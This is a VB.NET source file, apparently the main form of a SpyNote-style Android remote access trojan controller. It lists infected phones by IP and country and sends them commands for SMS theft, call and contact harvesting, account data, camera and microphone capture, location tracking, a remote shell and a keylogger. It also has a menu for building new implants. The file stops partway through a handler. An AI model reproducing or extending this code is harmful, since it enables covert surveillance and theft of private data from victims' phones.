Imports System.ComponentModel
Public Class Form1
    Public WithEvents s As New SocketServer
    Public imageList_0 As New ImageList()
    Public timer_0 As System.Timers.Timer
    Private timer_Bandwidth As System.Timers.Timer
    Private newHn% = 0
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Try
            HostReplaceToolStripMenuItem.Image = store_0.Bitmap_0("ctx_dns")
            CloseToolStripMenuItem.Image = store_0.Bitmap_0("ctx_close")
            UninstallToolStripMenuItem.Image = store_0.Bitmap_0("ctx_delete")
            RestartToolStripMenuItem.Image = store_0.Bitmap_0("ctx_refresh")
            FileManagerToolStripMenuItem.Image = store_0.Bitmap_0("ctx_file_manager")

            SMSManagerToolStripMenuItem.Image = store_0.Bitmap_0("ctx_sms_manager")

            CallsManagerToolStripMenuItem.Image = store_0.Bitmap_0("ctx_calls_manager")

            ContactsManagerToolStripMenuItem.Image = store_0.Bitmap_0("ctx_contacts_manager")

            LocationManagerToolStripMenuItem.Image = store_0.Bitmap_0("ctx_location_manager")

            AccountManagerToolStripMenuItem.Image = store_0.Bitmap_0("ctx_account_manager")

            CameraManagerToolStripMenuItem.Image = store_0.Bitmap_0("ctx_camera_manager")

            ShellTerminalToolStripMenuItem.Image = store_0.Bitmap_0("ctx_shell_manager")

            AudioRecorderToolStripMenuItem.Image = store_0.Bitmap_0("ctx_record_manager")

            ApplicationsToolStripMenuItem.Image = store_0.Bitmap_0("ctx_applications_manager")

            KeyloggerToolStripMenuItem.Image = store_0.Bitmap_0("ctx_keylogger_manager")

            Test0ToolStripMenuItem.Image = store_0.Bitmap_0("ctx_settings")

            PhoneToolStripMenuItem.Image = store_0.Bitmap_0("ctx_phone")

            ChatToolStripMenuItem.Image = store_0.Bitmap_0("ctx_chat")

            OpenFolderToolStripMenuItem.Image = store_0.Bitmap_0("ctx_open_folder")

            DataGridView1.Columns(0).HeaderCell.InheritedStyle.Clone()
            ContextMenuStrip1.Renderer = New Theme_0
            ContextMenuStrip2.Renderer = New Theme_0
            MenuStrip1.Renderer = New Theme_0


            timer_Bandwidth = New System.Timers.Timer(1000)
            AddHandler timer_Bandwidth.Elapsed, AddressOf BandwidthPerSec
            timer_Bandwidth.AutoReset = True
            timer_Bandwidth.Enabled = True

            If Not My.Settings.Process_Priority = 3 Then store_0.myProcessPreference()
            Text = store_0.name_prog
            Me.Icon = store_0.icons_0("window_error")
            store_0.Menu_Items()

            Dim b As Boolean = False
            Dim Files_List_Flag As String() = IO.Directory.GetFiles(Application.StartupPath & "\" & store_0.name_folder_app_resource & "\Flag\")
            Dim i As String
            For Each i In Files_List_Flag
                If b = False Then

                    Dim bi As Bitmap = store_0.Bitmap_0("null")
                    Me.Column6.Width = bi.Size.Width

                    Me.Flag.Width = Bitmap.FromFile(i).Size.Width
                    imageList_0.ImageSize = New Size(Bitmap.FromFile(i).Size.Width, Bitmap.FromFile(i).Size.Height)
                    imageList_0.ColorDepth = System.Windows.Forms.ColorDepth.Depth32Bit
                    b = True
                End If
                Dim FilePath As String = i
                Dim directoryPath As String = IO.Path.GetFileNameWithoutExtension(FilePath)
                imageList_0.Images.Add(directoryPath.ToUpper, Bitmap.FromFile(i))
            Next

        Catch ex As Exception
        End Try
    End Sub
    Delegate Sub Tit(ByVal L$, ByVal P$, ByVal refP$)
    Private oldL$, oldP$
    Sub refres_title(ByVal L$, ByVal P$, ByVal st$) Handles s.title
        Try
            If Me.InvokeRequired Then
                Dim inv As New Tit(AddressOf refres_title)
                Me.Invoke(inv, New Object() {L, P, st})
                Exit Sub
            Else
                If st = "x-x" Then
                    oldL = L
                    oldP = P
                End If
                Dim title As String = String.Format(store_0.name_prog + " - Ports: {0} Online: {1} Item: {2} Item Selection: {3}", If(st = "x-x", P, oldP), If(st = "x-x", L, oldL), CStr(DataGridView1.Rows.Count), CStr(DataGridView1.SelectedRows.Count))
                Text = title
            End If
        Catch ex As Exception
        End Try
    End Sub
    Sub connected(ByVal Number_Client As Integer) Handles s.Connected
        Try
            s.Send(Number_Client, "info" + s.SplitData)
        Catch ex As Exception
        End Try
    End Sub

    Delegate Sub dis(ByVal Number_Client As Integer)
    Sub disconnected(ByVal Number_Client As Integer) Handles s.DisConnected
        Try
            If Me.InvokeRequired Then
                Dim inv As New dis(AddressOf disconnected)
                Me.Invoke(inv, New Object() {Number_Client})

                Exit Sub
            Else
                If Not s.TcpState = False Then
                    If Not (listDataGrid.IndexOf(Number_Client) = -1) Then
                        If Not DataGridView1.Rows.Count = 0 Then
                            DataGridView1.Rows.RemoveAt(listDataGrid.IndexOf(Number_Client))
                            listDataGrid.RemoveAt(listDataGrid.IndexOf(Number_Client))
                            refres_title("0", "0", "update")
                        End If

                    End If
                End If

            End If
        Catch ex As Exception
        End Try

    End Sub
    Function wp_0(v$) As Bitmap
        If v = "-1" Or v = "" Then

            Return store_0.Bitmap_0("wp")
        Else

            Try
                Dim Converts() As Byte = Convert.FromBase64String(v)
                Dim ms As New IO.MemoryStream(Converts)
                Dim base64_wp As New Bitmap(Image.FromStream(ms))
                Return base64_wp
                ms.Dispose()
            Catch ex As Exception
                Return store_0.Bitmap_0("wp")
            End Try

        End If
        Return store_0.Bitmap_0("wp")
    End Function

    Delegate Sub spynote(ByVal Number_Client As Integer, ByVal Data_0 As String, ByVal id_0 As String, ByVal Name_Client_ As String)
    Dim listDataGrid As New List(Of String)
    Sub data(ByVal Number_Client As Integer, ByVal Data_0 As String, ByVal id_0 As String, ByVal Name_Client_0 As String) Handles s.Data

        Try
            If Me.InvokeRequired Then
                Dim inv As New spynote(AddressOf data)
                Me.Invoke(inv, New Object() {Number_Client, Data_0, id_0, Name_Client_0})
                Exit Sub
            Else
                Dim split_data() As String = {s.SplitData}
                Dim Array_b() As String = Data_0.Split(split_data, StringSplitOptions.None)

                Select Case Array_b(0)
                    Case "info"
                        If Not s.TcpState = False Then
                            Dim i As Integer = 0, index_image As Integer = 0
                            i = (Array.IndexOf(store_0.CountryCode, Array_b(1).ToUpper))
                            index_image = imageList_0.Images.IndexOfKey(Array_b(1).ToUpper)
                            Select Case i
                                Case -1
                                    i = 0
                                    index_image = -1
                                Case store_0.CountryName.Length
                                    i = i - 1
                                    index_image = -1
                                Case > store_0.CountryName.Length
                                    i = 0
                                    index_image = -1
                            End Select

                            Select Case index_image
                                Case -1
                                    index_image = imageList_0.Images.IndexOfKey("-1".ToUpper)
                            End Select
                            DataGridView1.Rows.Add(wp_0("-1"), If(Array_b(2).Length = 0, Space(1), Array_b(2)), store_0.CountryName(i), imageList_0.Images(index_image), s.getRemote_Address(Number_Client, 1), If(Array_b(3).Length = 0, Space(1), Array_b(3)), If(Array_b(4).Length = 0, Space(1), Array_b(4)), store_0.Bitmap_0("null"), "null")
                            listDataGrid.Add(Number_Client)
                            DataGridView1.Rows(DataGridView1.Rows.Count - 1).Cells(3).Tag = id_0 ' id folder
                            DataGridView1.Rows(DataGridView1.Rows.Count - 1).Cells(2).Tag = Number_Client ' id sock
                            DataGridView1.Rows(DataGridView1.Rows.Count - 1).Cells(3).ToolTipText = "Flag" & vbNewLine & store_0.CountryName(i)
                            Dim handle As Integer = 505
                            Dim A1 As MainNotice = My.Application.OpenForms("main_notice" & handle)
                            If A1 Is Nothing Then
                                A1 = New MainNotice
                                A1.Name = "main_notice" & handle
                                A1.Show()
                            End If
                            Dim str As String = index_image & s.split_Ary + s.getRemote_Address(Number_Client, 1) & s.split_Ary & If(Array_b(3).Length = 0, Space(1), Array_b(3)) & s.split_Ary & If(Array_b(2).Length = 0, Space(1), Array_b(2))
                            A1.AddNew.Add(str)
                            If A1.Timer1.Enabled = False Then
                                A1.Timer1.Enabled = True
                            End If
                            s.Send(Number_Client, "re_updating" + s.SplitData)
                            refres_title("0", "0", "update")
                            Dim folder_Clients As String = Application.StartupPath & "\" & store_0.name_folder_app_resource & "\Folder_Clients"
                            Dim folder_Client As String = Application.StartupPath & "\" & store_0.name_folder_app_resource & "\Folder_Clients\" & Name_Client_0 & id_0
Back_1:
                            If Not My.Computer.FileSystem.DirectoryExists(folder_Clients) Then
                                My.Computer.FileSystem.CreateDirectory(folder_Clients)
                                GoTo Back_1
                            Else
                                If Not My.Computer.FileSystem.DirectoryExists(folder_Client) Then
                                    My.Computer.FileSystem.CreateDirectory(folder_Client)
                                    GoTo Back_1
                                End If
                            End If
                        End If
                    Case "re_updating"
                        If Not s.TcpState = False Then
                            If DataGridView1.Rows.Count > 0 Then
                                Dim se% = 0
                                If Not (listDataGrid.IndexOf(Number_Client) = -1) Then
                                    se = listDataGrid.IndexOf(Number_Client)
                                    If DataGridView1.Rows(se).Cells(2).Tag = Number_Client Then
                                        Select Case Array_b(1)
                                            Case "Key&ScreenOn"
                                                DataGridView1.Rows(se).Cells(7).Value = store_0.Bitmap_0("Key&ScreenOn")
                                                DataGridView1.Rows(se).Cells(7).ToolTipText = "Phone Lock" & vbNewLine & "Key&ScreenOn"
                                            Case "Key&ScreenOff"
                                                DataGridView1.Rows(se).Cells(7).Value = store_0.Bitmap_0("Key&ScreenOff")
                                                DataGridView1.Rows(se).Cells(7).ToolTipText = "Phone Lock" & vbNewLine & "Key&ScreenOff"
                                            Case "ScreenOn"
                                                DataGridView1.Rows(se).Cells(7).Value = store_0.Bitmap_0("ScreenOn")
                                                DataGridView1.Rows(se).Cells(7).ToolTipText = "Phone Lock" & vbNewLine & "ScreenOn"
                                            Case "ScreenOff"
                                                DataGridView1.Rows(se).Cells(7).Value = store_0.Bitmap_0("ScreenOff")
                                                DataGridView1.Rows(se).Cells(7).ToolTipText = "Phone Lock" & vbNewLine & "ScreenOff"
                                            Case Else
                                                DataGridView1.Rows(se).Cells(7).Value = store_0.Bitmap_0("null")
                                                DataGridView1.Rows(se).Cells(7).ToolTipText = "Phone Lock" & vbNewLine & "null"
                                        End Select
                                        DataGridView1.Rows(se).Cells(8).Value = Array_b(2)
                                        DataGridView1.Rows(se).Cells(0).Value = wp_0(Array_b(3))
                                    End If
                                End If
                            End If

                        End If
                    Case "settings_phone"
                        Dim handle As Integer = Number_Client
                        Dim A1 As Settings_Phone = My.Application.OpenForms("settings_phone" & handle)
                        If A1 Is Nothing Then
                            A1 = New Settings_Phone
                            A1.Client_remote_Address = s.getRemote_Address(Number_Client, 1).ToString
                            A1.handle_Number_Client = handle
                            A1.Name_Client = Name_Client_0
                            A1.Client_ID = id_0
                            A1.Name = "settings_phone" & handle
                            A1.Show()
                        Else
                            If My.Settings.Windows_foreground Then
                                If (A1.WindowState = 1) Then A1.WindowState = 0
                                If (Not A1.ContainsFocus) Then A1.Focus()
                            End If

                        End If
                        A1.Client_data(Array_b(1))
                    Case "file_manager"
                        Dim handle As Integer = Number_Client
                        Dim A1 As File_Manager = My.Application.OpenForms("file_manager" & handle)
                        If A1 Is Nothing Then
                            If Array_b(1).Contains("[MyBase64/Photo]") And Array_b(1).StartsWith("[MyBase64/Photo]") Then
                                GoTo c
                            Else
                                A1 = New File_Manager
                                A1.Client_remote_Address = s.getRemote_Address(Number_Client, 1).ToString
                                A1.handle_Number_Client = handle
                                A1.Name_Client = Name_Client_0
                                A1.Client_ID = id_0
                                A1.Name = "file_manager" & handle
                                A1.Show()
                            End If
                        Else
                            If My.Settings.Windows_foreground Then
                                If (A1.WindowState = 1) Then A1.WindowState = 0
                                If (Not A1.ContainsFocus) Then A1.Focus()
                            End If
                        End If
                        A1.Client_data(Array_b(1))
c:
                    Case "download_manager"
                        Dim handle As Integer = Number_Client
                        Dim A1 As Download_Manager = My.Application.OpenForms("download_manager" & handle & Array_b(1))
                        If A1 Is Nothing Then
                            A1 = New Download_Manager
                            A1.Client_remote_Address = s.getRemote_Address(Number_Client, 1).ToString
                            A1.handle_Number_Client = handle
                            A1.Name_Client = Name_Client_0
                            A1.Client_ID = id_0
                            A1.Name = "download_manager" & handle & Array_b(1)
                            A1.Show()
                        Else
                            If My.Settings.Windows_foreground Then
                                If (A1.WindowState = 1) Then A1.WindowState = 0
                                If (Not A1.ContainsFocus) Then A1.Focus()
                            End If

                        End If
                        If Array_b(2).Trim = "0".Trim Then
                            A1.Client_data(Array_b(3), False, Nothing)
                        ElseIf Array_b(2).Trim = "1".Trim Then
                            A1.Client_data(Array_b(3), True, Array_b(4))
                        End If
                    Case "calls_manager"
                        Dim handle As Integer = Number_Client
                        Dim A1 As Calls_Manager = My.Application.OpenForms("calls_manager" & handle)
                        If A1 Is Nothing Then
                            A1 = New Calls_Manager
                            A1.Client_remote_Address = s.getRemote_Address(Number_Client, 1).ToString
                            A1.handle_Number_Client = handle
                            A1.Name_Client = Name_Client_0
                            A1.Client_ID = id_0
                            A1.Name = "calls_manager" & handle
                            A1.Show()
                        Else
                            If My.Settings.Windows_foreground Then
                                If (A1.WindowState = 1) Then A1.WindowState = 0
                                If (Not A1.ContainsFocus) Then A1.Focus()
                            End If

                        End If
                        A1.Client_data(Array_b(1))
                    Case "shell_terminal"
                        Dim handle As Integer = Number_Client
                        Dim A1 As Shell_Terminal = My.Application.OpenForms("shell_terminal" & handle)
                        If A1 Is Nothing Then
                            A1 = New Shell_Terminal
                            A1.Client_remote_Address = s.getRemote_Address(Number_Client, 1).ToString
                            A1.handle_Number_Client = handle
                            A1.Name_Client = Name_Client_0
                            A1.Client_ID = id_0
                            A1.Name = "shell_terminal" & handle
                            A1.Show()
                        Else
                            If My.Settings.Windows_foreground Then
                                If (A1.WindowState = 1) Then A1.WindowState = 0
                                If (Not A1.ContainsFocus) Then A1.Focus()
                            End If

                        End If
                        A1.Client_data(Array_b(1))
                    Case "notepad"
                        Dim handle As Integer = Number_Client
                        Dim A1 As Notepad = My.Application.OpenForms("notepad" & handle & Array_b(2))
                        If A1 Is Nothing Then
                            A1 = New Notepad
                            A1.Client_remote_Address = s.getRemote_Address(Number_Client, 1).ToString
                            A1.handle_Number_Client = handle
                            A1.Name_Client = Name_Client_0
                            A1.Client_ID = id_0
                            A1.pathFile = Array_b(3)
                            A1.Name = "notepad" & handle & Array_b(2)
                            A1.Show()
                        Else
                            If My.Settings.Windows_foreground Then
                                If (A1.WindowState = 1) Then A1.WindowState = 0
                                If (Not A1.ContainsFocus) Then A1.Focus()
                            End If

                        End If
                        A1.Client_data(Array_b(1))
                    Case "package_info"
                        newHn += 1
                        Dim handle As Integer = Number_Client
                        Dim A1 As Package_Info = My.Application.OpenForms("package_info" & handle & newHn)
                        If A1 Is Nothing Then
                            A1 = New Package_Info
                            A1.Client_remote_Address = s.getRemote_Address(Number_Client, 1).ToString
                            A1.handle_Number_Client = handle
                            A1.Name_Client = Name_Client_0
                            A1.Client_ID = id_0
                            A1.handle_Package_Info = newHn
                            A1.Name = "package_info" & handle & newHn
                            A1.Show()
                        Else
                            If My.Settings.Windows_foreground Then
                                If (A1.WindowState = 1) Then A1.WindowState = 0
                                If (Not A1.ContainsFocus) Then A1.Focus()
                            End If

                        End If
                        A1.Package_Info_00(Array_b(1))
                    Case "sms_manager"
                        Dim handle As Integer = Number_Client
                        Dim A1 As SMS_Manager = My.Application.OpenForms("sms_manager" & handle)
                        If A1 Is Nothing Then
                            A1 = New SMS_Manager
                            A1.Client_remote_Address = s.getRemote_Address(Number_Client, 1).ToString
                            A1.handle_Number_Client = handle
                            A1.Name_Client = Name_Client_0
                            A1.Client_ID = id_0
                            A1.Name = "sms_manager" & handle
                            A1.Show()
                        Else
                            If My.Settings.Windows_foreground Then
                                If (A1.WindowState = 1) Then A1.WindowState = 0
                                If (Not A1.ContainsFocus) Then A1.Focus()
                            End If

                        End If
                        A1.Client_data(Array_b(1))
                    Case "account_manager"
                        Dim handle As Integer = Number_Client
                        Dim A1 As Account_Manager = My.Application.OpenForms("account_manager" & handle)
                        If A1 Is Nothing Then
                            A1 = New Account_Manager
                            A1.Client_remote_Address = s.getRemote_Address(Number_Client, 1).ToString
                            A1.handle_Number_Client = handle
                            A1.Name_Client = Name_Client_0
                            A1.Client_ID = id_0
                            A1.Name = "account_manager" & handle
                            A1.Show()
                        Else
                            If My.Settings.Windows_foreground Then
                                If (A1.WindowState = 1) Then A1.WindowState = 0
                                If (Not A1.ContainsFocus) Then A1.Focus()
                            End If

                        End If
                        A1.Client_data(Array_b(1))
                    Case "contacts_manager"
                        Dim handle As Integer = Number_Client
                        Dim A1 As Contacts_Manager = My.Application.OpenForms("contacts_manager" & handle)
                        If A1 Is Nothing Then
                            A1 = New Contacts_Manager
                            A1.Client_remote_Address = s.getRemote_Address(Number_Client, 1).ToString
                            A1.handle_Number_Client = handle
                            A1.Name_Client = Name_Client_0
                            A1.Client_ID = id_0
                            A1.Name = "contacts_manager" & handle
                            A1.Show()
                        Else
                            If My.Settings.Windows_foreground Then
                                If (A1.WindowState = 1) Then A1.WindowState = 0
                                If (Not A1.ContainsFocus) Then A1.Focus()
                            End If

                        End If
                        A1.Client_data(Array_b(1))
                    Case "camera_manager"
                        Dim handle As Integer = Number_Client
                        Dim A1 As Camera_Manager = My.Application.OpenForms("camera_manager" & handle)
                        If A1 Is Nothing Then
                            A1 = New Camera_Manager
                            A1.Client_remote_Address = s.getRemote_Address(Number_Client, 1).ToString
                            A1.handle_Number_Client = handle
                            A1.Name_Client = Name_Client_0
                            A1.Client_ID = id_0
                            A1.Name = "camera_manager" & handle
                            A1.Show()
                        Else
                            If My.Settings.Windows_foreground Then
                                If (A1.WindowState = 1) Then A1.WindowState = 0
                                If (Not A1.ContainsFocus) Then A1.Focus()
                            End If

                        End If
                        A1.Client_data(Array_b(1), Array_b(2))
                    Case "record_audio"
                        Dim handle As Integer = Number_Client
                        Dim A1 As Record_Audio = My.Application.OpenForms("record_audio" & handle)
                        If A1 Is Nothing Then
                            A1 = New Record_Audio
                            A1.Client_remote_Address = s.getRemote_Address(Number_Client, 1).ToString
                            A1.handle_Number_Client = handle
                            A1.Name_Client = Name_Client_0
                            A1.Client_ID = id_0
                            A1.Name = "record_audio" & handle
                            A1.Show()
                        Else
                            If My.Settings.Windows_foreground Then
                                If (A1.WindowState = 1) Then A1.WindowState = 0
                                If (Not A1.ContainsFocus) Then A1.Focus()
                            End If
                        End If
                        If Array_b(1) = "[Im/Running]" Then
                            A1.Button1.Enabled = False
                        End If
                        A1.Client_data(Array_b(1))
                    Case "location_manager"
                        Dim handle As Integer = Number_Client
                        Dim A1 As Location_Manager = My.Application.OpenForms("location_manager" & handle)
                        If A1 Is Nothing Then
                            A1 = New Location_Manager
                            A1.Client_remote_Address = s.getRemote_Address(Number_Client, 1).ToString
                            A1.handle_Number_Client = handle
                            A1.Name_Client = Name_Client_0
                            A1.Client_ID = id_0
                            A1.Name = "location_manager" & handle
                            A1.Show()
                        Else
                            If My.Settings.Windows_foreground Then
                                If (A1.WindowState = 1) Then A1.WindowState = 0
                                If (Not A1.ContainsFocus) Then A1.Focus()
                            End If
                        End If
                        A1.Client_data(Array_b(1))
                    Case "applications"
                        Dim handle As Integer = Number_Client
                        Dim A1 As Applications = My.Application.OpenForms("applications" & handle)
                        If A1 Is Nothing Then
                            A1 = New Applications
                            A1.Client_remote_Address = s.getRemote_Address(Number_Client, 1).ToString
                            A1.handle_Number_Client = handle
                            A1.Name_Client = Name_Client_0
                            A1.Client_ID = id_0
                            A1.Name = "applications" & handle
                            A1.Show()
                        Else
                            If My.Settings.Windows_foreground Then
                                If (A1.WindowState = 1) Then A1.WindowState = 0
                                If (Not A1.ContainsFocus) Then A1.Focus()
                            End If

                        End If
                        A1.Client_data(Array_b(1))
                    Case "phone"
                        Dim handle As Integer = Number_Client
                        Dim A1 As Phone = My.Application.OpenForms("phone" & handle)
                        If A1 Is Nothing Then
                            A1 = New Phone
                            A1.Client_remote_Address = s.getRemote_Address(Number_Client, 1).ToString
                            A1.handle_Number_Client = handle
                            A1.Name_Client = Name_Client_0
                            A1.Client_ID = id_0
                            A1.Name = "phone" & handle
                            A1.Show()
                        Else
                            If My.Settings.Windows_foreground Then
                                If (A1.WindowState = 1) Then A1.WindowState = 0
                                If (Not A1.ContainsFocus) Then A1.Focus()
                            End If
                        End If
                        A1.Client_data(Array_b(1))
                    Case "chat"
                        Dim handle As Integer = Number_Client
                        Dim A1 As Chat = My.Application.OpenForms("chat" & handle)
                        If A1 Is Nothing Then
                            A1 = New Chat
                            A1.Client_remote_Address = s.getRemote_Address(Number_Client, 1).ToString
                            A1.handle_Number_Client = handle
                            A1.Name_Client = Name_Client_0
                            A1.Client_ID = id_0
                            A1.Name = "chat" & handle
                            A1.Show()
                        Else
                            If My.Settings.Windows_foreground Then
                                If (A1.WindowState = 1) Then A1.WindowState = 0
                                If (Not A1.ContainsFocus) Then A1.Focus()
                            End If
                        End If
                        A1.Client_data(Array_b(1))
                    Case "key_logger"
                        Dim handle As Integer = Number_Client
                        Dim A1 As key_logger = My.Application.OpenForms("key_logger" & handle)
                        If A1 Is Nothing Then
                            A1 = New key_logger
                            A1.Client_remote_Address = s.getRemote_Address(Number_Client, 1).ToString
                            A1.handle_Number_Client = handle
                            A1.Name_Client = Name_Client_0
                            A1.Client_ID = id_0
                            A1.Name = "key_logger" & handle
                            A1.Show()
                        Else
                            If My.Settings.Windows_foreground Then
                                If (A1.WindowState = 1) Then A1.WindowState = 0
                                If (Not A1.ContainsFocus) Then A1.Focus()
                            End If
                        End If
                        A1.Client_data(Array_b(1))
                    Case Else
                End Select
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Form1_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        If s.ListenerTCP.Count > 0 Then
            DataGridView1.Rows.Clear()
            listDataGrid.Clear()
            e.Cancel = True
            Try
                Dim cl As System.Threading.Thread = New Threading.Thread(AddressOf s.endserver)
                cl.IsBackground = True
                cl.Start(0)
            Catch ex As Exception
            End Try
        Else
            End
        End If

    End Sub
    Private Sub Test0ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles Test0ToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1

                s.Send(DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Tag, "settings_phone" + s.SplitData)
            Next
        End If
    End Sub
    Private Sub HostReplaceToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HostReplaceToolStripMenuItem.Click
        Dim id_list$ = Nothing
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                id_list += DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Tag.ToString + ","
            Next
            If id_list IsNot Nothing Then
                Dim a As New Host_replace
                a.host_re(id_list)
                a.ShowDialog()
                If a.DialogResult = DialogResult.OK Then
                    Dim result As String = a.TextBox2.Text
                    If Not result = Nothing Then
                        For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                            DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(1).Value = result
                        Next
                    End If
                End If
                a.Dispose()
                a.Close()
            End If
        End If
    End Sub

    Private Sub SettingsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SettingsToolStripMenuItem.Click
        Dim a As New Settings_0
        a.ShowDialog()
    End Sub

    Private Sub BuildAClientToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BuildAClientToolStripMenuItem.Click
        Dim a As New Build_client
        a.ShowDialog()
    End Sub
    Private Sub AboutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AboutToolStripMenuItem.Click

        Dim a As New about
        a.ShowDialog()
    End Sub

    Delegate Sub Listenwait_0(ByVal l As Boolean)
    Sub Listenwait(ByVal l As Boolean) Handles s.wiatLst
        If Me.InvokeRequired Then
            Dim inv As New Listenwait_0(AddressOf Listenwait)
            Me.Invoke(inv, New Object() {l})
            Exit Sub
        Else
            If l = False Then
                ListenOnPortToolStripMenuItem.Text = "Listen Port"
                ListenOnPortToolStripMenuItem.Tag = "off"
                ListenOnPortToolStripMenuItem.Enabled = True
                Icon = store_0.icons_0("window_error")
            End If
        End If
    End Sub
    Private Sub ListenOnPortToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ListenOnPortToolStripMenuItem.Click
        Try
            If ListenOnPortToolStripMenuItem.Tag = "on" Then
                DataGridView1.Rows.Clear()
                listDataGrid.Clear()
                ListenOnPortToolStripMenuItem.Text = "wait ..."
                Dim cl As System.Threading.Thread = New Threading.Thread(AddressOf s.endserver)
                cl.IsBackground = True
                cl.Start(1)
                ListenOnPortToolStripMenuItem.Enabled = False
            Else
                Try
Back:
                    Dim p As String = Nothing
                    Dim a As New open_port
                    a.tx("Open Port")
                    a.ShowDialog()

                    If a.DialogResult = DialogResult.OK Then
                        Dim result As String = a.GroupPrt
                        If Not result = Nothing Then
                            p = result
                        End If
                    End If
                    a.Dispose()
                    a.Close()
                    If String.IsNullOrEmpty(p) Then
                        GoTo nx
                    Else
                        If Not s.Start(p) Then
                            GoTo nx
                        End If
                    End If
                Catch ex As Exception
                    GoTo Back
                End Try
                ListenOnPortToolStripMenuItem.Tag = "on"
                ListenOnPortToolStripMenuItem.Text = "Close All Ports"
nx:
            End If
            refres_title("0", "0", "update")
        Catch ex As Exception
        End Try
    End Sub

    Private Sub OpenFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenFolderToolStripMenuItem.Click
        Try
            If DataGridView1.SelectedRows.Count > 0 Then
                For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                    Dim c As String = store_0.name_folder_app_resource & "\Folder_Clients" & "\" & DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(1).Value & DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(3).Tag
                    Process.Start(c)
                Next
            End If
        Catch ex As Exception
        End Try
    End Sub
    Private Sub DataGridView1_SelectionChanged(sender As Object, e As EventArgs) Handles DataGridView1.SelectionChanged
        If s.TcpState Then
            refres_title("0", "0", "update")
        End If
    End Sub
    Private Sub FileManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FileManagerToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                s.Send(DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Tag, "file_manager" + s.SplitData + "GetPath^&")

            Next
        End If
    End Sub

    Private Sub CallsManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CallsManagerToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                s.Send(DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Tag, "calls_manager")
            Next
        End If
    End Sub

    Private Sub ShellTerminalToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShellTerminalToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                s.Send(DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Tag, "shell_terminal" + s.SplitData + "cat /proc/version" + s.SplitData + "0")
            Next
        End If
    End Sub

    Private Sub SMSManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SMSManagerToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                s.Send(DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Tag, "sms_manager" + s.SplitData + "content://sms/" + s.SplitData + CStr(False))
            Next
        End If
    End Sub

    Private Sub AccountManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AccountManagerToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                s.Send(DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Tag, "account_manager")
            Next
        End If
    End Sub

    Private Sub ContactsManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ContactsManagerToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                s.Send(DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Tag, "contacts_manager")
            Next
        End If
    End Sub

    Private Sub CameraManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CameraManagerToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                s.Send(DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Tag, "camera_manager_find_camera")
            Next
        End If
    End Sub

    Private Sub RecordAudioToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AudioRecorderToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                s.Send(DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Tag, "audio_recorder")
            Next
        End If
    End Sub
    Private Sub LocationManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LocationManagerToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
                s.Send(DataGridView1.Rows(DataGridView1.SelectedRows(i).Index).Cells(2).Tag, "location_manager")
            Next
        End If
    End Sub
    Private Sub PhoneToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PhoneToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1
